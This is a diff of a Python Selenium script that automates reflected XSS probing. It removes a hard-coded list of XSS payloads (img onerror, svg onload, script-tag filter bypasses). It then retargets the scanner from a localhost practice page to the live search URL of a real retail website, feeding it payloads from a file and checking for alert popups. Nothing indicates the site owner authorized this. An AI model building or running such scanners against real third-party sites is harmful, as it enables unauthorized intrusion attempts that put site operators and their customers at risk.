@@ -4,35 +4,14 @@ from selenium.webdriver.support import expected_conditions as EC
 from selenium.common.exceptions import TimeoutException
 import time
 
-my_xss_payload = [
-	# "<img src=x onerror=alert(1)>",
-	# "<img src=x onerror=alert(1)",
-	# "<img/src=x/onerror=alert(1)>",
-	# "<script><script>alert(1)</script>",
-	# "<scr<object>ipt>alert(1)</script>",
-	# "<scr<object>ipt>alert(1)</scr<object>ipt>",
-	# "<svg onload=alert(1)>",
-	# "<svg/onload=alert(1)>",
-	# "<svg onload=alert(1)",
-	# "<marquee onstart=alert(1)></marquee>",
-	# "<marquee onstart=alert(1)",
-	# "<marquee onstart=alert(1)>",
-	# "<noscript><p title='</noscript><svg onload=alert(1)>'>",
-	# "<noscript><a title='</noscript><body onload=alert(1)>'>",	
-	# "<frameset onload=alert(1)>",
-	# "<iframe onload=alert(1)></iframe>",
-	# "<iframe src='http://localhost/penetrasi/iframe.html'></iframe>"
-]
-
 target_url = [
-	"http://localhost/penetrasi/learning-xss.php?name=",
+	"https://www.homebargains.co.uk/search.aspx?searchterms="
 ]
 
 driver = webdriver.Firefox(executable_path="D:\\driver\\geckodriver.exe");
 
-
-for index, item in enumerate(my_xss_payload):			
-
+myFile = open("./payload/my-payload-xss.txt", "r")
+for item in myFile:
 	for index_target_url, item_target_url in enumerate(target_url):
 		driver.get(item_target_url + item)
 
@@ -43,11 +22,10 @@ for index, item in enumerate(my_xss_payload):
 		except TimeoutException:
 			print("Alert does apper")
 
-		time.sleep(10)
-
-	time.sleep(5)
+		time.sleep(3)
+	
+	time.sleep(3)
 
 time.sleep(5);
 driver.quit();
-
 print("DONE")
